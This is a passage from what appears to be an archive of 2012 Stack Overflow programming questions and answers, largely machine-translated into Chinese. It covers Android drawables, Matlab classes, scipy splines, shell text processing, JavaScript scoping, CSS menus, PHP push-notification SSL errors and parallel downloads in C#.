    <item android:state_pressed="true">
        <shape android:shape="rectangle">
            <stroke android:width="1dp" android:color="#ff000000" />

            <gradient android:angle="-90" android:endColor="#d2914e" android:startColor="#906434" />

            <corners android:radius="5dp" />
        </shape>
    </item>
    <item app:state_checked="true">
        <shape android:shape="rectangle">
            <stroke android:width="1dp" android:color="#ff000000" />

            <gradient android:angle="-90" android:endColor="#d2914e" android:startColor="#906434" />

            <corners android:radius="5dp" />
        </shape>
    </item>
    <item>
        <shape android:shape="rectangle">
            <stroke android:width="1dp" android:color="#ff000000" />

            <gradient android:angle="-90" android:endColor="#4f5b6c" android:startColor="#345b75" />

            <corners android:radius="5dp" />
        </shape>
    </item>

</selector> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T15:37:13.910

Another wonderful trait of eclipse probably..

When I tried to revert my code to the last working version by hand (the state list drawable in the `android:src` tag), it produced the same error. I reverted from the SVN repo, it worked. Then I made the exact same changes as before, character by character, no difference, and voilá, it works now!

So that's it, the code in the question is fully functional.

# scala - scala 演员向邮箱的负责人发布消息

> ID：13514826
> 
> 赞同：1
> 
> 时间：2012-11-22T14:31:00.243
> 
> 标签：scala, actor

生产者演员可以将消息发布给另一个演员以立即处理吗？即向消费者邮箱的头部而不是消费者邮箱的尾部发布消息？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T16:07:29.760

你需要的是我相信的[PriorityExecutorBasedEventDrivenDispatcher （这里有一个](http://doc.akka.io/api/akka/1.2/akka/dispatch/PriorityExecutorBasedEventDrivenDispatcher.html)[简短的教程](http://thoughts.inphina.com/2011/09/19/using-akka-dispatchers-in-scala/)）。

# xml - 使用 ColladaLoader 加载巨大的 Threejs 场景

> ID：13514827
> 
> 赞同：1
> 
> 时间：2012-11-22T14:31:07.373
> 
> 标签：xml, google-chrome, three.js, collada

我需要使用 Collada 加载器将巨大的 3D 场景（大约 100 MB）加载到 Three.js 渲染器中。到目前为止，Chrome 总是失败。我知道这可能是内存管理的问题。

您有将大文件加载到 Chrome 中的经验吗？

# oop - 在 Matlab 中调用实际类

> ID：13514828
> 
> 赞同：1
> 
> 时间：2012-11-22T14:31:11.590
> 
> 标签：oop, class, matlab, extends

假设我有这个课程：

```
classdef abstractGame
    %UNTITLED Summary of this class goes here
    %   Detailed explanation goes here

    properties
    end

    methods (Abstract, Static)
        run(gambledAmount);
    end

    methods (Static)
        function init()
            gambledAmount = validNumberInput(abstractGame.getGambleString(), 1, 100, 'helpText', 'round');
        end
        function str = getGambleString()
            str = 'How much do you want to gamble?';
        end
    end

end 
```

其他类从这个类扩展而来。我希望子类重新定义 getGambleString 方法，并让 init 方法使用最深的类定义的方法（而不是 abstractGame.[...] 我想要类似 calledClass.[...] 的东西）。

我该怎么称呼它？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:48:01.833

那是一个`static virtual`功能问题；但是，即使在 C++[**中也不存在**](https://stackoverflow.com/questions/2721846/alternative-to-c-static-virtual-methods)这样的构造，那么我*想*在 matlab 中没有机会拥有它。（[`virtual`函数定义](http://en.wikipedia.org/wiki/Virtual_function)。）

顺便说一句，在 matlab 中，非静态方法的行为是虚拟的（就像在 Java 中一样），因此，如果您接受*不使用*静态函数，则可以获得所需的效果。

证明（简化代码）：

```
classdef abstractGame
  function str = init(obj)
        str = getGambleString(obj);
    end
    function str = getGambleString(obj)
        str = 'How much do you want to gamble?';
    end
  end
end

 classdef game < abstractGame
  methods 

    function str = getGambleString(obj)
        str = 'Hi!';
    end
  end    
 end

d = game;

d.init()

  ans =

   Hi! 
```

# windows - 将 rc 条目嵌入到 Windows 资源 DLL 文件是否有任何数量和大小限制？

> ID：13514831
> 
> 赞同：1
> 
> 时间：2012-11-22T14:31:17.770
> 
> 标签：windows, delphi, rc

我们可以通过在 Windows DLL 文件中定义 rc 来嵌入资源文件。

我想知道在 DLL 中可以存储多少个 rc 资源条目是否有任何限制？或者DLL文件的文件大小有限制吗？

与具有少于 1000 个资源项的 DLL 相比，访问存储超过 30,000 个资源项的 DLL 中的资源是否存在显着的速度性能差异？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-27T00:55:49.720

至于您可以拥有的最大资源数量，如果您询问限制，您可能做错了什么。;-) 说真的，单个 DLL 中有 30K 资源？但话虽如此，资源的最大数量因资源类型 IIRC 而异，尽管我在 MSDN 文档中找不到任何指定任何限制的内容。

对于第二个（文件大小限制），它与适用于特定 Windows 版本上的其他文件的文件大小限制相同。以 Win95 为例，FAT32 的文件大小限制为 4 GiB；NTFS、exFAT 和 UDF 文件系统的文件大小限制为`2^64 -1`MSDN 文章比较[文件系统功能](http://msdn.microsoft.com/en-us/library/ee681827%28VS.85%29.aspx)可能会有所帮助（这是我获得文件大小限制信息的地方）。

对于您的第三个问题（性能差异），当然有；迭代具有 30K 项的资源表（或多个表）显然比使用少于 1K 项的资源表需要更长的时间。具有较大文件的文件 I/O 也有更多开销，尽管 OS 文件缓存将有助于减轻该因素。

# scipy - 如何使用 scipy 计算三次样条插值的导数？

> ID：13514832
> 
> 赞同：5
> 
> 时间：2012-11-22T14:31:19.517
> 
> 标签：scipy

我有如下所示的数据集：

```
position number_of_tag_at_this_position
3 4
8 6
13 25
23 12 
```

我想对这个数据集应用三次样条插值来插值标签密度；为此，我运行：

```
import numpy as np
from scipy import interpolate`
x = [3,8,13,23]`
y = [4,6,25,12]`
tck = interpolate.splrep(x,y) # cubic` 
```

现在，我想在插值的每个点计算函数的导数，我该怎么做？谢谢你的帮助 ！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T18:37:54.573

参见手册：

[http://docs.scipy.org/doc/scipy/reference/generated/scipy.interpolate.splev.html](http://docs.scipy.org/doc/scipy/reference/generated/scipy.interpolate.splev.html)

注意参数`der`。

# php - 仅在用户尝试进行身份验证时才请求 HTTP 身份验证

> ID：13514833
> 
> 赞同：0
> 
> 时间：2012-11-22T14:31:25.527
> 
> 标签：php, http-headers

我想到的是检测身份验证尝试并使用 PHP 和标准 HTTP 凭据登录用户，而不会在他不尝试登录时通过弹出窗口来打扰他。这听起来很简单，但我们必须记住，浏览器会检查站点是否请求身份验证，如果没有，它们会向用户发出警告，并且它们也不会发送任何数据。有没有绕道？有什么诀窍吗？

**问题摘要：**

*   我希望 url [http://example.com/site](http://example.com/site)在没有任何提示和弹出窗口的情况下工作。用户将看到该站点是*匿名*的。
*   我希望 url [http://user:password@example.com/site](http://user:password@example.com/site)也可以在没有任何弹出窗口的情况下工作。用户将以*用户身份查看该站点*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T16:21:04.107

回答你的问题：不，没有办法。如果网站没有请求，浏览器不会发送身份验证信息，并且正如您所发现的，它还会向用户显示令人讨厌的安全警告。您应该硬着头皮使用 GET 参数。

# grep - Grep 和 Cut 命令并分割字符串

> ID：13514834
> 
> 赞同：0
> 
> 时间：2012-11-22T14:31:27.000
> 
> 标签：grep, cut, divide

我有一个 grep 命令，它提供以下字符串：

```
20121121001100 18 0 16 2 18 
```

但我想修改这个字符串以获得

```
20121121 001 18 0 16 2 18 
```

上述值是通过以下方式提取的：

```
for i in `ls -1 file.txt | sort`; do echo $i`
grep datetime $i | wc -l ``
grep abc $i | wc -l ``
grep def $i | wc -l ``
grep ghi $i | wc -l ``
grep jkl $i | wc -l ` ; done | cut -c9-500 
```

使用 cut -c9-500 是因为原始字符串的形式为

```
datetime20121121001100 18 0 16 2 18 
```

并 cut -c9-500 返回

```
20121121001100 18 0 16 2 18 
```

有人可以帮我得到吗

```
20121121 001 18 0 16 2 18 
```

（即删除日期部分的最后 3 位数字）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:36:44.763

您想要/做的大部分事情都可以通过`awk`. 但是对于您想要的最低要求：

```
for i in `ls -1 file.txt | sort`; do echo $i`
grep datetime $i | wc -l ``
grep abc $i | wc -l ``
grep def $i | wc -l ``
grep ghi $i | wc -l ``
grep jkl $i | wc -l ` ; done | cut -c9-500 | awk '{print substr($0,1,11) substr($0,15) }' 
```

`awk`非常擅长文本处理。

编辑：我不确定你在做什么，但是，基本上这（几乎）是一样的：

```
awk 'FILENAME != oldfilename {oldfilename = FILENAME; dt = 0 ; a = 0; d = 0; g = 0; j = 0}
     /datetime/ {dt++}
     /abc/ {a++}
     /def/ {d++}
     /ghi/ {g++}
     /j/ {j++}
     END {print FILENAME, dt, a, d, g, j}' * 
```

而且它更快，更少的进程等......基本上 awk 处理文件，计算指定字符串的出现次数，并在完成文件时（在最后一行之后）打印报告。

更改规格：

```
for i in `ls -1 file.txt | sort`; do echo $i`
grep datetime $i | wc -l ``
grep abc $i | wc -l ``
grep def $i | wc -l ``
grep ghi $i | wc -l ``
grep jkl $i | wc -l ` ; done | cut -c9-500 | awk '{print substr($0,1,8) " " substr($0,9,4) substr($0,15) }' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:38:27.480

管道到 sed：

```
echo "20121121001100 18 0 16 2 18" | sed -r 's/^([0-9]+)[0-9][0-9][0-9] (.*)$/\1 \2/' 
```

给

```
20121121001 18 0 16 2 18 
```

# jquery - 使用 jquery 读取列表或地图

> ID：13514835
> 
> 赞同：0
> 
> 时间：2012-11-22T14:31:27.343
> 
> 标签：jquery

我有一个从我的控制器填充并添加到模型对象的列表，我正在尝试使用 jquery 在客户端访问列表的值。有没有办法使用 jquery 在客户端检索列表或地图的值。下面是我的代码。

在控制器中。

```
List<String> list = new ArrayList<String>();
list.add("username");
list.add("password");
mav.addObject("list", list); 
```

在js中

```
<script type="text/javascript">
    var command = "${list}";
    alert("comand" + command);
</script> 
```

警报将 o/p 作为 [用户名，密码]，我如何迭代列表并使用 jquery 检索这些值。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:55:12.343

Try changing the return type of your mvc action to JsonResult. So your mvc method should look like:

```
public JsonResult MyMethod()
{
        List<String> list = new ArrayList<String>();
        list.add("username");
        list.add("password");
        mav.addObject("list", list);
} 
```

# xaml - 将按钮标题绑定到变量 + 修复 xaml 中的文本

> ID：13514836
> 
> 赞同：0
> 
> 时间：2012-11-22T14:31:33.760
> 
> 标签：xaml, binding

我想将按钮标题绑定到文件名，但我想在文件名之前和之后有修复文本。在没有代码的情况下，这在 xaml 中是否可行？

像这样的东西：

```
<Button Header="Save {Binding ActiveDocument.FileName} as..." Command="{Binding ActiveDocument.SaveAsCommand}" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T21:32:05.547

Well I have never tried that to be honest. But Binding object has StringFormat property. So you can simply try this.

```
<Button Content="{Binding ActiveDocument.FileName, StringFormat='Save {0} as...'}" Command="{Binding ActiveDocument.SaveAsCommand}" /> 
```

another possible way is setting Buttons ContentStringFormat property

```
<Button Content="{Binding ActiveDocument.FileName}" ContentStringFormat="Save {0} as..." Command="{Binding ActiveDocument.SaveAsCommand}" /> 
```

# java - 如何处理 GWT/GXT 中的客户端异常？

> ID：13514838
> 
> 赞同：1
> 
> 时间：2012-11-22T14:31:34.170
> 
> 标签：java, gwt, smartgwt, gxt

我正在使用 GWT。如果生成任何服务器端异常，我们将发送一封包含错误详细信息的电子邮件（已使用 log4j SMTPAppender）。根据行号，我们可以解决问题..

我的情况是，如果在客户端包代码中生成任何异常，截至目前，我们会给出通用消息“发生某些异常”。但是是否可以显示错误堆栈跟踪以及异常原因和行号？我的代码如下：

```
 GWT.setUncaughtExceptionHandler(new   
                      GWT.UncaughtExceptionHandler() {  
                      public void onUncaughtException(Throwable e) {  

                          Window.alert("Some Exception has Occured");

                      }    

                    }); 
```

我认为这是不可能的，因为客户端包在 web 模式下转换为 Javascript。如果有任何方法可以显示异常原因和发生的行号，请建议我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T22:21:59.313

我建议使用 gwt-log： [项目页面](http://code.google.com/p/gwt-log/)

gwt-log 支持 'UncaughtExceptionHandler' 和 RemoteLogger 以向服务器发送消息/异常。

在 gwt-log 中，您还可以打开“模拟堆栈”，这正是您想要做的： [Wiki Page - Emulated Stack](http://code.google.com/p/gwt-log/wiki/GettingStarted#Get_more_our_of_gwt-log)

但是请注意，这会在编译后的 JS 脚本中添加大量代码

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:47:59.667

你可以阅读[这个页面](https://developers.google.com/web-toolkit/doc/latest/DevGuideLogging)

基本上，您必须使用 JUL 进行日志记录，它是客户端日志记录：firebug、JS 控制台等...您可以使用 RemoteLogging 做一些更聪明的事情，但我无法帮助您。

主要问题是不支持 log4j。也许通过 JUL 和 log4j 之间的桥梁，您将能够实现您想要的一切

# javascript - 如何从 JavaScript 的公共方法中访问私有属性？

> ID：13514840
> 
> 赞同：0
> 
> 时间：2012-11-22T14:31:34.920
> 
> 标签：javascript, oop, inheritance, prototype

> **可能重复：**
> [Javascript：我是否需要为对象中的每个变量放置 this.var？](https://stackoverflow.com/questions/13418669/javascript-do-i-need-to-put-this-var-for-every-variable-in-an-object)

我想在 JavaScript 中创建一个“类”，其他“类”应该从中继承。

因此，我使用原型对象添加了“公共方法”。

在这些方法中，我想访问我的类的私有属性。

好像我无法访问它们。我该怎么做呢？这是我的代码：

```
<!doctype html>

<html>

    <head>
        <title>OOP test</title>

        <script>

            var ParentClass = function(){
                var data = [];
            }

            ParentClass.prototype.addData = function(somedata){
                data.push(somedata); // ReferenceError: Can't find variable: data
            }

            var p = new ParentClass();
            p.addData("foo");

        </script>
    </head>

    <body>
    </body>

</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:34:12.810

```
<head>
    <title>OOP test</title>

    <script>

        var ParentClass = function(){
            this.data = [];
        }

        ParentClass.prototype.addData = function(somedata){
            this.data.push(somedata); // ReferenceError: Can't find variable: data
        }

        var p = new ParentClass();
        p.addData("foo");

    </script>
</head>

<body>
</body> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T14:34:25.133

没有公共或私有（即使你引用它们），只有对象属性和变量。您不能访问不在范围内的变量。该`.addData`方法的定义超出了`data`变量的范围。

只要您有对对象的引用，就可以访问对象属性，因此将其设为对象属性：

```
var ParentClass = function(){
    this.data = [];
}

ParentClass.prototype.addData = function(somedata){
    this.data.push(somedata);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:39:41.987

它会引发引用错误，因为变量“数据”是函数“父类”的“私有”。为了模拟可以使用闭包类型方法的功能。

```
var ParentClass = function(){
    var data = [];
    this.addData = function(somedata){
        data.push(somedata); // Closure will have access to all variables in 'ParentClass'
    }
} 
```

但是，这会干扰您似乎希望实现的原型继承。

# php - 为什么codeigniter谷歌地图库不加载标记图标

> ID：13514843
> 
> 赞同：1
> 
> 时间：2012-11-22T14:31:42.633
> 
> 标签：php, codeigniter, google-maps-api-3

我使用包含 Google maps API V3 库的 codeigniter。一切都加载到构造函数等...

我的控制器内容来自...

```
 $config['icon'] = "http://localhost/xampp/zadanie_/myimg.png";
   $config['center'] = $data['lat'].",".$data['lon'];
   $config['map_height'] = 180;
   $config['sensor'] = false;
   $config['map_width'] = 198;
   $config['disableMapTypeControl'] = TRUE;
   $config['disableStreetViewControl'] = TRUE;
   $config['zoom'] = '10';

   $this->googlemaps->initialize($config);

   $marker = array();
   $marker['position'] = $data['lat'].",".$data['lon'];
   $this->googlemaps->add_marker($marker); 
```

之后，加载页面...生成的 Javascript 包含以下代码：

```
function initialize() {

                 var myLatlng = new google.maps.LatLng(48.1405,17.0948);
                var myOptions = {
                    zoom: 10,
                    center: myLatlng,
                    mapTypeId: google.maps.MapTypeId.ROADMAP,
                    mapTypeControl: false,
                    streetViewControl: false}
                map = new google.maps.Map(document.getElementById("map_canvas"), myOptions);

            var myLatlng = new google.maps.LatLng(48.1405,17.0948);

            var markerOptions = {
                map: map,
                position: myLatlng      
            };
            marker_0 = createMarker(markerOptions);

            } 
```

没有**图标**项。我在做什么坏事？:(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:34:05.260

替换 `$config['icon'];`为`$marker['icon'];`解决问题。

# html - 如何在容器中定位绝对元素？

> ID：13514845
> 
> 赞同：1
> 
> 时间：2012-11-22T14:31:49.160
> 
> 标签：html, css, navigation, position

`il`我正在尝试通过提供主菜单的相对位置及其`ul`内部的绝对位置来在元素下制作带有子菜单的菜单。为什么子菜单将 to`ul`视为它的容器而不是它的父级`li`？

的HTML：

```
<nav>
    <ul>
        <li><a href="#">Menu Item 1</a></li>
        <li><a href="#">Menu Item 2</a>
            <ul>
                <li><a href="#">Submenu Item 1</a></li>
                <li><a href="#">Submenu Item 2</a></li>
                <li><a href="#">Submenu Item 3</a></li>
            </ul>
        </li>
        <li><a href="#">Menu Item 3</a></li>
        <li><a href="#">Menu Item 4</a></li>
        <li><a href="#">Menu Item 5</a></li>
    </ul>
</nav>​ 
```

的CSS：

```
nav a {
    float: left;
    padding: 10px;
    border: solid 1px #C0C0C0;
    margin-left: -1px;
}

nav li {
    position: relative;
}

nav li ul {
    position: absolute;
} 
```

[​http://jsfiddle.net/6pgHa/](http://jsfiddle.net/6pgHa/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:37:14.340

这可能是因为它是您的锚标记向左浮动并因此定义了位置，而不是 li 元素。

`nav a`将选择器更改为`nav li`并修复它。li 元素在您当前的代码中并没有真正的位置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T15:02:46.040

我已经更新了你的小提琴，使菜单按照我猜你想要的方式工作：http: [//jsfiddle.net/6pgHa/3/](http://jsfiddle.net/6pgHa/3/)

```
nav {
 width: 600px;
 margin: 50px auto 0;
}

nav > ul li {
 float: left;
 position: relative;
}

nav > ul li a {
 float: left;
 padding: 10px;
 border: solid 1px #C0C0C0;
 display:inline-block;
}

nav > ul li ul {
 position: absolute;
 top:50px;
 left:-9999px;
}

nav > ul li:hover ul {
 left:0;
} 
```

# php - apns没有在php中连接

> ID：13514851
> 
> 赞同：0
> 
> 时间：2012-11-22T14:32:09.760
> 
> 标签：php, ssl, notifications, apple-push-notifications

我是推送通知的新手，并尝试按照以下方法解决此问题，但仍然出现相同的错误。

1.  将 C:\PHP\ext 添加到 Windows 路径
2.  将 libeay32.dll 和 ssleay32.dll 添加到 C:\WINDOWS\system32\inetsrv
3.  重新启动服务器

第一个错误：-

> 致命错误：未捕获的异常“ApnsPHP_Exception”和消息“无法连接到 'ssl://gateway.sandbox.push.apple.com:2195'：无法找到套接字传输“ssl” - 您是否忘记启用它时你配置了PHP？(0)' 在 C:\wamp\www\ApnsPHP-master\ApnsPHP\Abstract.php 第 396 行

第二个错误：-

> ApnsPHP_Exception: Unable to connect to 'ssl://gateway.sandbox.push.apple.com:2195': Unable to find the socket transport "ssl" - 您在配置 PHP 时是否忘记启用它？(0) 在 C:\wamp\www\ApnsPHP-master\ApnsPHP\Abstract.php 第 396 行

*我正在使用以前在其他地方使用过的 .pem 文件，并且我正在尝试在 localhost 上运行我的文件，这有关系吗？*

如果有人知道我应该怎么做来解决这个错误，那么请帮助我！
并提前感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:49:36.423

您应该查看您的配置中是否启用了 SSL。

要显示您的配置，只需将以下内容复制/粘贴到某个 php 文件中，然后使用浏览器浏览到它：

```
<?php
   phpInfo();
?> 
```

# bash - 添加两个带有十进制数字的文件，丢弃带有非数字值的行

> ID：13514852
> 
> 赞同：-1
> 
> 时间：2012-11-22T14:32:11.980
> 
> 标签：bash

需要读取两个文件，每个文件都有一个十进制数字列，并将它们逐行添加到第三个文件中。我可以用 bash 和 bc 来做到这一点。问题：在某些情况下，这两个文件可能包含非数字值。当我遇到非数字值时，我需要知道它不是数字并跳过该行，即使一个文件具有有效数字，然后继续添加剩余的行。想在 Bash 本身中做到这一点。下面的例子：

**文件 1**

```
1.1 
2.89
Nan
4.32 
```

**文件2**

```
2.1
2.1
42.6
1.1 
```

**File3（结果文件）**

```
3.2
4.99
5.42 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:49:43.930

利用：

```
paste -d+ file1 file2 | bc 2>/dev/null >file3 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:49:23.930

我会使用`awk`和`paste`作为：

```
paste file1 file2 | awk '/^([0-9]+\.?|\.?)([0-9]*)*[ \t]+[0-9]+\.?([0-9]*)*$/ { print $1+$2 }' > File3 
```

# release - 在发布模式下使用 QML 桌面组件的问题

> ID：13514855
> 
> 赞同：0
> 
> 时间：2012-11-22T14:32:15.637
> 
> 标签：release, desktop, qml

我想编写具有精美 UI 的 c++ 桌面应用程序，所以我在 QT Creator 中完成了它。

然后我决定添加一些 UI 功能，并转向 QML（QT 快速应用程序）。

我根据[此处](https://stackoverflow.com/questions/6298584/installing-qt-quick-components-for-desktop-for-use-with-qt-creator)的说明安装了 QML 桌面组件，使用`import Qt.labs.components 0.1`并且运行良好。但是现在我必须部署我的应用程序，并且我注意到该应用程序仅在调试模式下运行，而不是在发布模式下运行。我检查了一下，发现我只有 styleplugind.dll，而不是 styleplugin.dll。很快，我只有调试 dll，没有发布版本。我再次安装了组件，以便发布，我真的得到了 styleplugin.dll。但是当我运行我的应用程序时（我记得将 CONFIG+=release 添加到我的 .pro 文件中），我收到了这个错误：

```
loaded for module "Qt.labs.components": The plugin 'C:/QtSDK/Desktop/Qt/4.7.4/mingw/imports/Qt/labs/components/plugin/styleplugin.dll' uses incompatible Qt library. Expected build key "Windows mingw release full-config", got "Windows mingw debug full-config" 
 import Qt.labs.components 0.1 
 ^ 
```

我不明白为什么会这样：我有正确的 .dll 文件，而且一切似乎都很好。

（顺便说一句，我在 Windows7 上）

我应该怎么办？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T09:07:01.640

问题是，正如错误输出所述，您的 styleplugin.dll 仍然是针对不兼容的 Qt 构建（`debug`预期为`release`）构建的。

# php - 从另一个网站获取信息？

> ID：13514858
> 
> 赞同：0
> 
> 时间：2012-11-22T14:32:18.330
> 
> 标签：php, html-parsing, fetch, moodle

我想从这个站点（在中心板）获取所有最新消息： [http](http://web.hanu.vn/en/) ://web.hanu.vn/en/ 我最新的方法是在 PHP 中使用 Simple HTML DOM Parser 来解析 html，但我认为是这样慢的。我的想法是从类似这个网站的近 20 个类似网站获取新闻。它们都是由 Moodle 开发的，因此它们具有相同的 html 格式。但是，1 个站点需要几秒钟才能获取 => 20 个站点需要很多时间。有没有比解析 HTML 更好的方法？或者我应该将结果存储在数据库中并在一段时间后更新它而不是为每个用户请求获取它？我在做所谓的“爬行”，不是吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T21:05:32.947

> 或者我应该将结果存储在数据库中并在一段时间后更新它而不是为每个用户请求获取它？

是的你应该。并坚持解析 HTML，[不要使用正则表达式解析 HTML](https://stackoverflow.com/q/701166/548696)。

而您正在尝试做的是网页抓取，而不是抓取（除非您真的*抓取*页面）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T15:24:27.537

我建议您使用 curl 下载页面，并在不使用 regex 的情况下进行正确的处理，尝试使用 substr、strpos、strip 标签等......并将最后的通知存储在数据库中，并使用 cronjob 更新它。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-22T15:09:20.257

我建议您使用正则表达式。（[维基百科](http://en.wikipedia.org/wiki/Regular_expressions)）此外，使用 strpos 和 substr 函数去除 HTML 数据的某些部分是一个非常好的主意，它们比正则表达式更快。这是一个不错[的](http://myregexp.com/signedJar.html)正则表达式测试器。

# c# - 使用任务并行检索包含 html 文档源的字符串

> ID：13514860
> 
> 赞同：1
> 
> 时间：2012-11-22T14:32:19.887
> 
> 标签：c#, .net-4.0, task-parallel-library, system.net

我真的希望有人对`TPL`&`System.Net`类和方法都有足够的经验

一开始只是对当前顺序操作集的使用的简单想法`TPL`导致我停止了我的项目。

由于我对 .NET 还很陌生，所以使用 TPL 直接跳到深水......

我试图使用提取 Aspx 页面的源/内容（html）`WebClient`

每天有多个请求（大约 20-30 页要通过）并从源代码中提取特定值......这只是服务器在其列表中的少数日常任务之一，

引导我尝试使用 TPL 来实现它，从而获得一些速度。

虽然我尝试使用`Task.Factory.StartNew()`尝试迭代几个 WC 实例，但 **在第一次尝试**执行 WC 时，应用程序并没有从`WebClient`

这是我最后一次尝试

```
 static void Main(string[] args)
    {
        EnumForEach<Act>(Execute);
        Task.WaitAll();
    }

    public static void EnumForEach<Mode>(Action<Mode> Exec)
    {
            foreach (Mode mode in Enum.GetValues(typeof(Mode)))
            {
                Mode Curr = mode;

                Task.Factory.StartNew(() => Exec(Curr) );
            }
    }

    string ResultsDirectory = Environment.CurrentDirectory,
        URL = "",
        TempSourceDocExcracted ="",
        ResultFile="";

        enum Act
        {
            dolar, ValidateTimeOut
        }

    void Execute(Act Exc)
    {
        switch (Exc)
        {
            case Act.dolar:
                URL = "http://www.AnyDomainHere.Com";
                ResultFile =ResultsDirectory + "\\TempHtm.htm";
                TempSourceDocExcracted = IeNgn.AgilityPacDocExtraction(URL).GetElementbyId("Dv_Main").InnerHtml;
                File.WriteAllText(ResultFile, TempSourceDocExcracted);
                break;
            case Act.ValidateTimeOut:
                URL = "http://www.AnotherDomainHere.Com";
                ResultFile += "\\TempHtm.htm";
                TempSourceDocExcracted = IeNgn.AgilityPacDocExtraction(URL).GetElementbyId("Dv_Main").InnerHtml;
                File.WriteAllText(ResultFile, TempSourceDocExcracted);
                break;
        }

        //usage of HtmlAgilityPack to extract Values of elements by their attributes/properties
        public HtmlAgilityPack.HtmlDocument AgilityPacDocExtraction(string URL)
        {
            using (WC = new WebClient())
            {
                WC.Proxy = null;
                WC.Encoding = Encoding.GetEncoding("UTF-8");
                tmpExtractedPageValue = WC.DownloadString(URL);
                retAglPacHtmDoc.LoadHtml(tmpExtractedPageValue);
                return retAglPacHtmDoc;
            }
        } 
```

我究竟做错了什么？是否可以使用`WebClient`使用 TPL 或者我应该使用其他工具（无法使用 IIS 7 / .net4.5）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:40:39.377

我至少看到几个问题：

1.  命名 -`FlNm`不是名称 - VisualStudio 是具有智能代码完成功能的现代 IDE，无需保存击键（您可以从这里开始，也有其他选择，主要是保持一致：[C# Coding Conventions](http://msdn.microsoft.com/en-us/library/vstudio/ff926074.aspx)。

2.  如果您使用多线程，则需要关心资源共享。例如 FlNm 是一个静态字符串，它是在每个线程内分配的，所以它的值不是确定性的（即使它是按顺序运行的，代码也会出错 - 你会在每次迭代中在路径中添加文件名，所以它会是像 c:\TempHtm.htm\TempHtm.htm\TempHtm.htm)

3.  您正在从不同的线程写入同一个文件（好吧，至少我认为这是您的意图） - 通常这是多线程灾难的秘诀。问题是，如果您根本需要将任何内容写入磁盘，或者可以将其作为字符串下载并在不接触磁盘的情况下进行解析 -[有一个很好的例子是什么意思 touch a disk](http://architects.dzone.com/articles/every-programmer-should-know)。

4.  总的来说，我认为你应该只并行下载，所以不要在多线程中涉及 HtmlAgilityPack，因为我认为你不知道它是线程安全的。另一方面，下载将具有良好的性能/线程数比率，html 解析 - 不是那么多，如果线程数等于内核数，但不会更多。甚至更多——我会将下载和解析分开，因为它更容易测试、理解和维护。

更新：我不明白你的全部意图，但这可能会帮助你开始（它不是生产代码，你应该添加重试/错误捕获等）。最后还有扩展的 WebClient 类，允许您获得更多的线程，因为默认情况下 webclient 只允许两个连接。

```
class Program
{
    static void Main(string[] args)
    {
        var urlList = new List<string>
                          {
                              "http://google.com",
                              "http://yahoo.com",
                              "http://bing.com",
                              "http://ask.com"
                          };

        var htmlDictionary = new ConcurrentDictionary<string, string>();
        Parallel.ForEach(urlList, new ParallelOptions { MaxDegreeOfParallelism = 20 }, url => Download(url, htmlDictionary));
        foreach (var pair in htmlDictionary)
        {
            Process(pair);
        }
    }

    private static void Process(KeyValuePair<string, string> pair)
    {
        // do the html processing
    }

    private static void Download(string url, ConcurrentDictionary<string, string> htmlDictionary)
    {
        using (var webClient = new SmartWebClient())
        {
            htmlDictionary.TryAdd(url, webClient.DownloadString(url));
        }
    }
}

public class SmartWebClient : WebClient
{
    private readonly int maxConcurentConnectionCount;

    public SmartWebClient(int maxConcurentConnectionCount = 20)
    {
        this.maxConcurentConnectionCount = maxConcurentConnectionCount;
    }

    protected override WebRequest GetWebRequest(Uri address)
    {
        var httpWebRequest = (HttpWebRequest)base.GetWebRequest(address);
        if (httpWebRequest == null)
        {
            return null;
        }

        if (maxConcurentConnectionCount != 0)
        {
            httpWebRequest.ServicePoint.ConnectionLimit = maxConcurentConnectionCount;
        }

        return httpWebRequest;
    }
} 
```

# javascript - 在沙盒 Chrome 应用程序中无法卸载

> ID：13514863
> 
> 赞同：2
> 
> 时间：2012-11-22T14:32:26.387
> 
> 标签：javascript, google-chrome, dojo, google-chrome-extension, google-chrome-app

我正在使用 Dijit (Dojo Toolkit) 在沙盒页面中生成 HTML 布局，但每次调用 dijit 文件时，都会得到`Uncaught unload is not available in packaged apps.`.

现在我不确定这是 Dojo 的问题，还是 Chrome 的新安全策略限制。

我的文件：

```
/** manifest.json **/
{
  "name": "Hello App",
  "version": "2.0",
  "manifest_version": 2,
  "description": "A app that says hello",
  "app": {
    "background": {
      "scripts" : ["js/app.js"]
    }
  },
  "permissions": [

  ],
  "sandbox": {
    "pages" : ["live.html"]
  }
}

/** js/app.js **/
chrome.app.runtime.onLaunched.addListener(function(){
  chrome.app.window.create('live.html', {width:screen.width,
    height: screen.height});
});

/** js/helloapp/app.js **/
/** This is the file that actually calls Dijit to build the layout **/
define(function(){
  require(["dijit/layout/ContentPane",
